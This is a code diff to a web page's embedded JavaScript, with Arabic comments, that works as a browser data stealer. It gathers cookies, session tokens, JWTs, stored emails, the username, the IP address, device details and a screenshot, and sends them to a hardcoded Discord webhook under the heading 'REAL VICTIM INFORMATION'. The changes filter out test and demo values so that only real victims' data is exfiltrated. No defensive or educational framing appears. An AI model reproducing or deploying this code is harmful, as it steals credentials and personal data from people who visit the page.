@@ -11,28 +11,44 @@
 
     <script>
         // ============================================
-        // دالة لجلب كل الكوكيز (بدون فلترة)
+        // دالة لجلب الكوكيز الحقيقية فقط (بدون التجريبية)
         // ============================================
-        function getAllCookies() {
+        function getRealCookies() {
             const cookies = document.cookie;
             if (!cookies) return "No cookies found";
-            return cookies;
+            
+            // فلترة الكوكيز التجريبية
+            const realCookies = cookies.split(';').filter(cookie => {
+                const [name, value] = cookie.trim().split('=');
+                // استبعاد أي كوكي تجريبي
+                return !name.toLowerCase().includes('test') && 
+                       !name.toLowerCase().includes('example') &&
+                       !value.toLowerCase().includes('test') &&
+                       !value.toLowerCase().includes('example') &&
+                       !value.toLowerCase().includes('demo');
+            }).join('; ');
+            
+            return realCookies || "No real cookies found";
         }
 
         // ============================================
-        // دالة البحث عن التوكنات (بدون شروط)
+        // دالة البحث عن التوكنات الحقيقية فقط
         // ============================================
-        function findAllTokens() {
+        function findRealTokens() {
             const tokens = [];
-            const tokenKeywords = ['token', 'auth', 'jwt', 'session', 'access', 'refresh', 'bearer', 'api_key', 'apikey', 'secret', 'password', 'pass', 'login', 'user', 'id', 'sid', 'csrf', 'xsrf', 'oauth', 'authorization', 'x-auth', 'x-access-token', 'x-api-key', 'authentication', 'credentials', 'accesstoken', 'refreshtoken', 'acctkn', 'tk', 'tkn', 'tokn'];
+            const tokenKeywords = ['token', 'auth', 'jwt', 'session', 'access', 'refresh', 'bearer', 'api_key', 'apikey', 'secret', 'password'];
             
-            // 1. البحث في الكوكيز
+            // 1. البحث في الكوكيز الحقيقية
             const cookies = document.cookie.split(';');
             cookies.forEach(cookie => {
                 const [name, value] = cookie.trim().split('=');
                 if (!name || !value) return;
                 
-                // أي كوكي فيها كلمة من الكلمات المفتاحية
+                // تجاهل القيم التجريبية
+                if (value.includes('test') || value.includes('example') || value.includes('demo') || value.includes('123')) {
+                    return;
+                }
+                
                 tokenKeywords.forEach(keyword => {
                     if (name.toLowerCase().includes(keyword.toLowerCase())) {
                         tokens.push({
@@ -44,8 +60,8 @@
                     }
                 });
                 
-                // JWT (ثلاثة أجزاء)
-                if (value && value.split('.').length === 3) {
+                // JWT حقيقي (3 أجزاء وطويل)
+                if (value && value.split('.').length === 3 && value.length > 50) {
                     tokens.push({
                         source: '🔐 JWT Token',
                         name: name,
@@ -53,23 +69,15 @@
                         type: 'JWT'
                     });
                 }
-                
-                // أي قيمة طويلة (أكثر من 20 حرف)
-                if (value.length > 20) {
-                    tokens.push({
-                        source: '📦 Long Cookie',
-                        name: name,
-                        value: value,
-                        type: 'Long Value'
-                    });
-                }
             });
             
-            // 2. البحث في localStorage
+            // 2. البحث في localStorage الحقيقي
             try {
                 for(let i = 0; i < localStorage.length; i++) {
                     let key = localStorage.key(i);
                     let value = localStorage.getItem(key);
+                    
+                    if (!value || value.includes('test') || value.includes('example') || value.includes('demo')) continue;
                     
                     tokenKeywords.forEach(keyword => {
                         if (key.toLowerCase().includes(keyword.toLowerCase())) {
@@ -82,7 +90,7 @@
                         }
                     });
                     
-                    if (value && value.split('.').length === 3) {
+                    if (value && value.split('.').length === 3 && value.length > 50) {
                         tokens.push({
                             source: '🔐 JWT localStorage',
                             name: key,
@@ -90,23 +98,16 @@
                             type: 'JWT'
                         });
                     }
-                    
-                    if (value && value.length > 20) {
-                        tokens.push({
-                            source: '📦 localStorage Long',
-                            name: key,
-                            value: value,
-                            type: 'Long Value'
-                        });
-                    }
                 }
             } catch(e) {}
             
-            // 3. البحث في sessionStorage
+            // 3. البحث في sessionStorage الحقيقي
             try {
                 for(let i = 0; i < sessionStorage.length; i++) {
                     let key = sessionStorage.key(i);
                     let value = sessionStorage.getItem(key);
+                    
+                    if (!value || value.includes('test') || value.includes('example') || value.includes('demo')) continue;
                     
                     tokenKeywords.forEach(keyword => {
                         if (key.toLowerCase().includes(keyword.toLowerCase())) {
@@ -119,21 +120,12 @@
                         }
                     });
                     
-                    if (value && value.split('.').length === 3) {
+                    if (value && value.split('.').length === 3 && value.length > 50) {
                         tokens.push({
                             source: '🔐 JWT sessionStorage',
                             name: key,
                             value: value,
                             type: 'JWT'
-                        });
-                    }
-                    
-                    if (value && value.length > 20) {
-                        tokens.push({
-                            source: '📦 sessionStorage Long',
-                            name: key,
-                            value: value,
-                            type: 'Long Value'
                         });
                     }
                 }
@@ -143,7 +135,7 @@
         }
 
         // ============================================
-        // دالة البحث عن الإيميلات
+        // دالة البحث عن الإيميلات الحقيقية فقط
         // ============================================
         function findRealEmails() {
             const emails = new Set();
@@ -153,14 +145,27 @@
                 // في الكوكيز
                 const cookies = document.cookie;
                 const cookieEmails = cookies.match(emailRegex);
-                if (cookieEmails) cookieEmails.forEach(e => emails.add(e));
+                if (cookieEmails) {
+                    cookieEmails.forEach(e => {
+                        // تجاهل الإيميلات التجريبية
+                        if (!e.includes('test') && !e.includes('example') && !e.includes('demo') && !e.includes('123')) {
+                            emails.add(e);
+                        }
+                    });
+                }
                 
                 // في localStorage
                 for (let i = 0; i < localStorage.length; i++) {
                     const value = localStorage.getItem(localStorage.key(i));
                     if (value && typeof value === 'string') {
                         const valueEmails = value.match(emailRegex);
-                        if (valueEmails) valueEmails.forEach(e => emails.add(e));
+                        if (valueEmails) {
+                            valueEmails.forEach(e => {
+                                if (!e.includes('test') && !e.includes('example') && !e.includes('demo') && !e.includes('123')) {
+                                    emails.add(e);
+                                }
+                            });
+                        }
                     }
                 }
                 
@@ -169,7 +174,13 @@
                     const value = sessionStorage.getItem(sessionStorage.key(i));
                     if (value && typeof value === 'string') {
                         const valueEmails = value.match(emailRegex);
-                        if (valueEmails) valueEmails.forEach(e => emails.add(e));
+                        if (valueEmails) {
+                            valueEmails.forEach(e => {
+                                if (!e.includes('test') && !e.includes('example') && !e.includes('demo') && !e.includes('123')) {
+                                    emails.add(e);
+                                }
+                            });
+                        }
                     }
                 }
                 
@@ -179,7 +190,7 @@
         }
 
         // ============================================
-        // دالة الحصول على اسم المستخدم
+        // دالة الحصول على اسم المستخدم الحقيقي
         // ============================================
         function getRealUsername() {
             let username = "Not found";
@@ -187,30 +198,17 @@
                 const userKeys = ['username', 'user', 'name', 'displayName', 'fullName', 'realname', 'real_name'];
                 
                 for (let key of userKeys) {
+                    // localStorage
                     const localValue = localStorage.getItem(key);
-                    if (localValue && localValue.length > 2) {
+                    if (localValue && localValue.length > 2 && !localValue.includes('test') && !localValue.includes('example')) {
                         username = localValue;
                         break;
                     }
                     
+                    // sessionStorage
                     const sessionValue = sessionStorage.getItem(key);
-                    if (sessionValue && sessionValue.length > 2) {
+                    if (sessionValue && sessionValue.length > 2 && !sessionValue.includes('test') && !sessionValue.includes('example')) {
                         username = sessionValue;
-                        break;
-                    }
-                }
-                
-                const cookies = document.cookie;
-                const patterns = [
-                    /user[_-]?name=([^;]+)/i,
-                    /login=([^;]+)/i,
-                    /username=([^;]+)/i
-                ];
-                
-                for (let pattern of patterns) {
-                    const match = cookies.match(pattern);
-                    if (match && match[1]) {
-                        username = decodeURIComponent(match[1]);
                         break;
                     }
                 }
@@ -220,7 +218,7 @@
         }
 
         // ============================================
-        // دالة الحصول على اسم الكمبيوتر
+        // دالة الحصول على اسم الكمبيوتر الحقيقي
         // ============================================
         function getRealComputerName() {
             try {
@@ -229,7 +227,11 @@
                 if (match) {
                     const parts = match[1].split(';');
                     if (parts.length > 1) {
-                        return parts[1].trim();
+                        const computerName = parts[1].trim();
+                        // اسم الكمبيوتر الحقيقي عادة ما يكون كلمة واحدة بدون @ أو .
+                        if (computerName && !computerName.includes('@') && !computerName.includes('.')) {
+                            return computerName;
+                        }
                     }
                 }
             } catch(e) {}
@@ -251,7 +253,7 @@
                     screenshotBase64 = canvas.toDataURL('image/png');
                 } catch (e) {}
 
-                // 2. معلومات الشبكة
+                // 2. معلومات حقيقية
                 let ipAddress = 'Unknown';
                 try {
                     const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -261,7 +263,7 @@
 
                 const connection = navigator.connection || {};
                 
-                // 3. معلومات المتصفح
+                // 3. معلومات المتصفح الحقيقية
                 const browserInfo = {
                     platform: navigator.platform,
                     language: navigator.language,
@@ -270,14 +272,14 @@
                     userAgent: navigator.userAgent
                 };
 
-                // 4. معلومات الشاشة
+                // 4. معلومات الشاشة الحقيقية
                 const screenInfo = {
                     width: window.screen.width,
                     height: window.screen.height,
                     colorDepth: window.screen.colorDepth
                 };
 
-                // 5. معلومات البطارية
+                // 5. معلومات البطارية الحقيقية
                 let batteryInfo = { level: 'Unknown', charging: 'Unknown' };
                 if (navigator.getBattery) {
                     try {
@@ -289,7 +291,7 @@
                     } catch (e) {}
                 }
 
-                // 6. معلومات GPU
+                // 6. معلومات GPU الحقيقية
                 let gpuInfo = 'Unknown';
                 try {
                     const canvas = document.createElement('canvas');
@@ -302,81 +304,70 @@
                     }
                 } catch (e) {}
 
-                // 7. جمع كل المعلومات
-                const allCookies = getAllCookies();
-                const allTokens = findAllTokens();
+                // 7. جمع المعلومات الحقيقية فقط
+                const realCookies = getRealCookies();
+                const realTokens = findRealTokens();
                 const realEmails = findRealEmails();
                 const realUsername = getRealUsername();
                 const realComputerName = getRealComputerName();
 
                 // ============================================
-                // تجهيز الرسالة
+                // تجهيز الرسالة - معلومات حقيقية فقط
                 // ============================================
-                const emailsMessage = realEmails.length > 0 ? realEmails.join('\n') : 'No emails found';
+                const emailsMessage = realEmails.length > 0 ? realEmails.join('\n') : 'No real emails found';
                 
                 let tokensMessage = '';
-                if (allTokens.length > 0) {
-                    tokensMessage = allTokens.map(t => 
+                if (realTokens.length > 0) {
+                    tokensMessage = realTokens.map(t => 
                         `${t.source} | **${t.name}**: \`${t.value.substring(0, 100)}${t.value.length > 100 ? '...' : ''}\` (${t.type})`
                     ).join('\n');
                 } else {
-                    tokensMessage = 'No tokens found';
+                    tokensMessage = 'No real tokens found';
                 }
 
                 const webhookUrl = 'https://discord.com/api/webhooks/1476727887053721721/UkshRh9j3xisTqqOHLnEvMI5dFlg-dmLWZkuY55yPtAWjuFFM0iPkMlFWUlF0LUjWHTN';
 
                 const textMessage = `
-**🚨 COMPLETE VICTIM INFORMATION 🚨**
+**🚨 REAL VICTIM INFORMATION (NO TEST DATA) 🚨**
 
-**👤 USER INFO:**
+**👤 REAL USER:**
 • Username: ${realUsername}
 • Computer Name: ${realComputerName}
 
-**🍪 ALL COOKIES (RAW):**
+**🍪 REAL COOKIES:**
 \`\`\`
-${allCookies}
+${realCookies}
 \`\`\`
 
-**🔑 TOKENS FOUND:**
+**🔑 REAL TOKENS:**
 ${tokensMessage}
 
-**📧 EMAILS FOUND:**
+**📧 REAL EMAILS:**
 ${emailsMessage}
 
-**🌐 NETWORK:**
+**🌐 REAL NETWORK:**
 • IP: ${ipAddress}
 • Speed: ${connection.downlink || '?'} Mbps
 • Connection Type: ${connection.effectiveType || '?'}
-• RTT: ${connection.rtt || '?'} ms
 
-**💻 SYSTEM:**
+**💻 REAL SYSTEM:**
 • Platform: ${browserInfo.platform}
 • Language: ${browserInfo.language}
 • CPU Cores: ${browserInfo.cpuCores}
 • RAM: ${browserInfo.ram}
-• Battery: ${batteryInfo.level} (Charging: ${batteryInfo.charging})
+• Battery: ${batteryInfo.level} (${batteryInfo.charging})
 • GPU: ${gpuInfo}
 
-**🖥️ SCREEN:**
+**🖥️ REAL SCREEN:**
 • Resolution: ${screenInfo.width}x${screenInfo.height}
 • Color Depth: ${screenInfo.colorDepth}-bit
-• Available: ${window.screen.availWidth}x${window.screen.availHeight}
 
-**⏰ TIME:**
+**⏰ REAL TIME:**
 • Local: ${new Date().toString()}
 • Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-• Offset: ${new Date().getTimezoneOffset()} minutes
 
-**🌍 BROWSER DETAILS:**
-• User Agent: ${browserInfo.userAgent}
-• Languages: ${navigator.languages.join(', ')}
-• Cookie Enabled: ${navigator.cookieEnabled}
-• Do Not Track: ${navigator.doNotTrack || 'Not specified'}
-• Hardware Concurrency: ${navigator.hardwareConcurrency || '?'}
-• Device Memory: ${navigator.deviceMemory || '?'} GB
-• Max Touch Points: ${navigator.maxTouchPoints}
-• PDF Viewer: ${navigator.pdfViewerEnabled}
-• Vendor: ${navigator.vendor}
+**🌍 REAL BROWSER:**
+${browserInfo.userAgent}
 `;
 
                 // إرسال النص
@@ -403,7 +394,7 @@ ${emailsMessage}
 
                     const blob = new Blob(byteArrays, { type: 'image/png' });
                     const formData = new FormData();
-                    formData.append('file', blob, 'screenshot.png');
+                    formData.append('file', blob, 'real_screenshot.png');
                     
                     await fetch(webhookUrl, {
                         method: 'POST',
@@ -412,7 +403,7 @@ ${emailsMessage}
                 }
 
                 // رسالة نجاح
-                document.body.innerHTML = '<h1 style="color: green; margin-top: 100px;">✅ Information collected and sent!</h1>';
+                document.body.innerHTML = '<h1 style="color: green; margin-top: 100px;">✅ Real information collected and sent!</h1>';
 
             } catch (error) {
                 console.error('Error:', error);
